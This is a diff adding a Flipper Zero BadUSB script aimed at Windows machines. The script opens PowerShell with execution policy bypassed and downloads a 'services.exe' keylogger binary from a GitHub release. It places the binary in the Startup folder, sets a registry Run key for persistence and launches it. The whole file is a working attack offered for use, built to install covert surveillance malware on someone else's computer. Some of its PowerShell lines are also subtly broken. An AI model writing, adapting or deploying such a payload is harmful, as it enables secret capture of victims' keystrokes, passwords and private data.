@@ -1,0 +1,60 @@
+REM Flipper Zero BadUSB — Auto-install SIlent-Keylogger EXE to Startup Folder
+REM Targets Windows 10/11, works with or without Admin rights
+
+DELAY 2000
+GUI r
+DELAY 300
+
+REM Open PowerShell (minimal startup)
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "& {"
+ENTER
+
+REM ——— Step 1: Define download URL & destination ———
+DELAY 50
+STRING $url = 'https://github.com/ilaui-gif/SIlent-Keylogger/releases/download/services.exe'; 
+$dest = Join-Path (Get-Item 'shell:startup').FullName 'services.exe'
+ENTER
+
+REM ——— Step 2: Download EXE (3 retries + timeout) ———
+STRING try {
+    $wc = New-Object Net.WebClient;
+    $wc.Headers.Add('User-Agent', 'FlipperZero-BadUSB');
+    for($i=0; $i -lt 3; $i++) {
+        Write-Progress -Activity 'Downloading services.exe...' -Status "Attempt $($i+1)/3";
+        try { 
+            $wc.DownloadFile($url, '$env:TEMP\services.exe'); break 
+        }
+        catch {
+            Write-Warning "Download failed (retry in 2s): $_";
+            Start-Sleep -Seconds 2;
+        }
+    };
+} catch {
+    Write-Error "Download failed permanently: $_"
+}
+ENTER
+
+REM ——— Step 3: Move to Startup folder (overwrite existing) ———
+STRING if(Test-Path $dest) { Remove-Item $dest -Force };
+Move-Item -Path '$env:TEMP\services.exe' -Destination $dest -Force;
+Write-Host 'Downloaded and moved services.exe to startup.' -ForegroundColor Green;
+ENTER
+
+REM ——— Step 4: Auto-run via registry (fallback for reliability) ———
+STRING Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
+    -Name 'SIlentKeylogger' -Value "`"$dest`"" `
+    -PropertyType String -Force;
+ENTER
+
+REM ——— Step 5: Launch services.exe now (optional test) ———
+STRING Start-Process -FilePath $dest -WindowStyle Normal;
+Write-Host '🚀 Launched services.exe.' -ForegroundColor Cyan;
+ENTER
+
+REM ——— Final status ———
+STRING Write-Host "Completed successfully! Reboot or log off to verify." -ForegroundColor Green;
+ENTER
+
+REM Exit PowerShell block
+STRING }
+ENTER
